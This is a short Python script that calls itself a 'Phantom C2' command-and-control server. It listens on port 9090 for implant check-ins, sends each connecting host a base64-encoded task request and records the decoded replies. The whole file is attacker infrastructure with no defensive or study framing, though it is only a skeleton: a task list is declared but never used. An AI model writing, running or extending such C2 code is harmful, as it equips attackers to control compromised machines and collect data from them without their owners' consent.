import socket, threading, base64

HOST = '0.0.0.0'
PORT = 9090
TASKS = []
RESULTS = []

def handle_client(conn, addr):
    print(f"[+] Phantom check-in from {addr[0]}")
    try:
        conn.sendall(base64.b64encode(b'GET /task') + b'\n')
        task = conn.recv(4096).strip()
        if task:
            decoded = base64.b64decode(task).decode()
            print(f"[>] Response from {addr[0]}: {decoded}")
            RESULTS.append((addr[0], decoded))
    except Exception as e:
        print(f"[!] Error with {addr[0]}: {e}")
    finally:
        conn.close()

def serve():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Phantom C2 listening on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr)).start()

if __name__ == '__main__':
    serve()
